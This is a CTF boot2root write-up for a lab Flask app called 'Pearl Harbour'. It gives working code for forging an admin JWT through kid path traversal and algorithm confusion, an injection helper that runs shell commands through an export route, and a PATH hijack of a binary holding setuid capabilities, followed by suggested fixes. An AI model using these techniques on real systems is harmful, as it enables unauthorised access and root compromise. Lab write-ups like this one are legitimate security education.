---
title: "Pearl Harbour: A Forged Captain and a Capability That Sailed to Root"
date: 2026-10-13
draft: false
description: "A tiny Flask app called the Pacific Fleet Cargo and Manifest Registry. It hands out guest JWTs, trusts the kid and alg fields in the header, and shells out to pdftotext with a filename I control. Three mistakes later: root."
tags: ["CTF", "Web Exploitation", "JWT", "Command Injection", "Linux Privilege Escalation", "Boot2Root"]
categories: ["CTF Writeups"]
authors: ["z3ro"]
---

<div class="dr-hero">
  <div class="dr-hero-top">
    <span class="dr-badge">Web</span>
    <span class="dr-badge red">Boot2Root</span>
    <span class="dr-badge cyan">2 flags</span>
    <span class="dr-badge ghost">r00t CTF · Pearl Harbour</span>
  </div>
  <div class="dr-title">PEARL HARBOUR</div>
  <p class="dr-sub">A single Flask service calling itself the <strong>Pacific Fleet Cargo and Manifest Registry</strong>. It mints guest JWTs, then reads the verification key from a path you control and honours the algorithm you name. The admin export route runs <code>pdftotext</code> through a shell with a filename you also control. Past that, root is one Linux capability and one very suggestible <code>execlp</code> away.</p>
</div>

<div class="dr-stats">
  <div class="dr-stat"><span class="n cyan">5000</span><span class="l">Only open port</span></div>
  <div class="dr-stat"><span class="n">2</span><span class="l">Bugs on the web face</span></div>
  <div class="dr-stat"><span class="n red">1</span><span class="l">Capability to root</span></div>
  <div class="dr-stat"><span class="n">2</span><span class="l">Flags captured</span></div>
</div>

<div class="dr-flag">
  <span class="l">user.txt</span>
  <code>r00t{a_t0rp3d0_n4m3d_k1d}</code>
</div>

<div class="dr-flag">
  <span class="l">root.txt</span>
  <code>r00t{c4p_s3tu1d_s4nk_th3_f1l33t}</code>
</div>

## TL;DR

Pearl Harbour is a small Python app wearing a naval uniform. The whole box is four moves:

1. `POST /api/guest/token` returns an RS256 JWT. Its header carries a `kid`, and the app opens the key file named by that `kid` with no path sanitisation at all.
2. I point `kid` at a file whose bytes I can already read (a public SVG served by the same app), flip `alg` to `HS256`, and sign my own `role=admin` token with those bytes as the HMAC key.
3. `POST /api/diagnostics/export` builds a `pdftotext` command with my filename in it and runs it through a shell. Semicolons are welcome.
4. `getcap -r /` shows `manifest-sign` carrying `cap_setgid,cap_setuid=ep`, and it calls `execlp("manifest-helper", ...)`. I own `$PATH`, so I own what runs as root.

![The Pearl Harbour chain: guest token, a traversal in kid, algorithm confusion, command injection, and a capability that ends at root](/public/images/pearl-harbour/00_chain.svg)

## Step 0: One Port, Nothing Else

The target was a single host behind the VPN, `172.16.1.10`. A full sweep turned up exactly one thing listening:

![A full nmap sweep returns a single open port and a Werkzeug banner](/public/images/pearl-harbour/01_recon.png)

Werkzeug 3.1.9 on Python 3.12.15. The root page is a shipping manifest UI. The interesting surface is the JSON API behind it:

- `POST /api/guest/token` issues a token to anyone.
- `GET /api/manifest/list` needs **a** valid token, but only an inspector one.
- `POST /api/diagnostics/export` is the documented admin route.

Fetching a guest token gives a perfectly normal RS256 JWT. Decoding the header tells the whole story before a single signature is checked:

```
alg: RS256    kid: default.pub.pem    typ: JWT
```

Two of those three fields are attacker input as far as the server is concerned.

## Step 1: It Reads the Key From My Path

Here is the vulnerable verification path, lightly abridged:

```python
def verify_token(token):
    header = jwt.get_unverified_header(token)
    kid = header.get("kid", DEFAULT_KID)
    alg = header.get("alg", "RS256")

    key_path = os.path.join(KEYS_DIR, kid)   # <-- no sanitisation
    with open(key_path, "rb") as f:
        key_material = f.read()

    claims = jwt.decode(token, key_material, algorithms=[alg])  # <-- alg from the header
    return claims
```

Two lines, two problems. The `kid` is concatenated straight onto the keys directory, so `../../` walks wherever I like. The `alg` is taken from the header and handed to PyJWT, so I choose how the signature gets checked.

There is a decoy endpoint, `/api/token/refresh`, that looks like it has the same `kid` handling but reduces it with `os.path.basename` and pins `alg` to RS256 server side. If you pattern match on "found a `kid`, done", that one wastes your evening. The real bug lives in the verifier every other route actually calls.

<div class="dr-callout warn">
  <span class="t">The key idea</span>
  <p>A JWT is only as trustworthy as the key the verifier picks. If the token gets to name its own key file <strong>and</strong> its own algorithm, then the attacker and the server can be holding the exact same secret, and only one of them knows it.</p>
</div>

## Step 2: Algorithm Confusion, Signed With a Public File

The app serves a decorative file, `/static/dockyard-emblem.svg`, to every visitor. I can download it. So can the server. That is a shared secret in the worst possible sense: it is not secret at all, and I can make the server use it as the HMAC key.

The plan:

- `kid` = `../static/dockyard-emblem.svg`, which resolves to a readable file that is not a key.
- `alg` = `HS256`, so PyJWT treats those bytes as a symmetric key.
- Sign `{"sub": "admin", "role": "admin"}` with the same bytes.

The whole forgery is about a dozen lines:

```python
import base64, json, hmac, hashlib, requests

B = "http://172.16.1.10:5000"
key = requests.get(B + "/static/dockyard-emblem.svg").content  # anyone can fetch this

def b64url(b):
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

header  = {"alg": "HS256", "kid": "../static/dockyard-emblem.svg", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin"}

h = b64url(json.dumps(header,  separators=(",", ":")))
p = b64url(json.dumps(payload, separators=(",", ":")))
sig = b64url(hmac.new(key, (h + "." + p).encode(), hashlib.sha256).digest())

token = h + "." + p + "." + sig
```

That token opens the admin door. The first `manifest/list` call with it returns data instead of a 403, which is the moment the box tips over from reading to doing:

![The forged token is built from a public file, and the app verifies it happily](/public/images/pearl-harbour/02_forge.png)

## Step 2b: The Export Route Runs a Shell

The admin diagnostics route is meant to convert a stored manifest to text with the system `pdftotext`. It takes a JSON `filename` and builds a command with it. Somewhere in the code that command goes to `subprocess` with `shell=True`, and there is no argument escaping.

An injection here does not need anything clever. A leading `x;` closes the harmless first command, `#` comments out the rest of the template, and whatever sits in the middle runs:

```python
def run(cmd):
    body = {"filename": "x;" + cmd + " #"}
    r = requests.post(B + "/api/diagnostics/export",
                      headers={"Authorization": "Bearer " + token}, json=body)
    return r.json()["stdout"]
```

`cat /home/dockhand/user.txt` returns the first flag. So does almost anything else, because I now have a shell as the `dockhand` service account:

![The export route returns clean command output, including user.txt](/public/images/pearl-harbour/03_rce.png)

At this point I have `uid=1000(dockhand)`, a home directory, and the user flag. Root is not reachable through the app at all, which is the point. It lives outside the web surface.

## Step 3: Root Is a Capability and a PATH

The classic first move after landing is `getcap -r /`, and it pays off immediately:

```
/usr/local/bin/manifest-sign cap_setgid,cap_setuid=ep
```

`manifest-sign` is a small binary that, by design, drops to root so it can sign cargo manifests. It does that with file capabilities. Then it invokes a helper. The helper is called by bare name:

```
execlp("manifest-helper", ...)
```

`execlp` searches `$PATH`. There is a legitimate `manifest-helper` in `/usr/local/bin`, but if I put my own earlier in the path, mine wins. The binary is the one running as root, so the helper I supply runs as root too:

```bash
# attacker-controlled $PATH
echo 'cat /root/root.txt' > /tmp/ph/manifest-helper
chmod +x /tmp/ph/manifest-helper

PATH=/tmp/ph:$PATH /usr/local/bin/manifest-sign
```

That prints the root flag. No exploit code, no memory corruption, just a root process trusting the environment it was launched in:

![A file capability plus a relative execlp is a root shell waiting to happen](/public/images/pearl-harbour/04_privesc.png)

<div class="dr-callout ok">
  <span class="t">Both flags down</span>
  <p><code>user.txt</code> came from the injected shell. <code>root.txt</code> came from hijacking a helper that a capability-bearing binary called by relative name. Two clean bugs on the way in, one configuration mistake on the way up.</p>
</div>

## What I Would Fix

None of this is exotic, which is exactly why it is worth writing down. Four changes close the box:

<div class="dr-traps">
  <div class="dr-trap">
    <span class="t"><span class="x">✗</span> kgid/key path from the token</span>
    Never derive a filesystem path from a token header. Pin the key to a known, mapped `kid` value and reject anything that does not match.
    <span class="truth">no traversal, no key swap</span>
  </div>
  <div class="dr-trap">
    <span class="t"><span class="x">✗</span> algorithm chosen by the caller</span>
    Pin the expected algorithm server side. If the service issues RS256, verify RS256 and nothing else.
    <span class="truth">HS256 tokens stop working</span>
  </div>
  <div class="dr-trap">
    <span class="t"><span class="x">✗</span> shelling out with a filename</span>
    Pass arguments as a list to `subprocess` without `shell=True`, and validate the filename against a strict allowlist.
    <span class="truth">semicolons become literal text</span>
  </div>
  <div class="dr-trap">
    <span class="t"><span class="x">✗</span> a root helper found on PATH</span>
    Call the helper by absolute path, or drop the capability entirely and use a narrowly scoped root service.
    <span class="truth">the environment stops mattering</span>
  </div>
</div>

## Flags

<div class="dr-verdict">
  <div class="half auth">
    <span class="big">user.txt</span><br>
    r00t{a_t0rp3d0_n4m3d_k1d}<br>
    <small>shell injection as dockhand</small>
  </div>
  <div class="half ghosts">
    <span class="big">root.txt</span><br>
    r00t{c4p_s3tu1d_s4nk_th3_f1l33t}<br>
    <small>capability plus PATH hijack</small>
  </div>
</div>

A good reminder that a JWT is only as trustworthy as the two fields you refuse to read from it. The attack was not a cracked signature. It was the server asking the token how it should be verified. Thanks for reading.
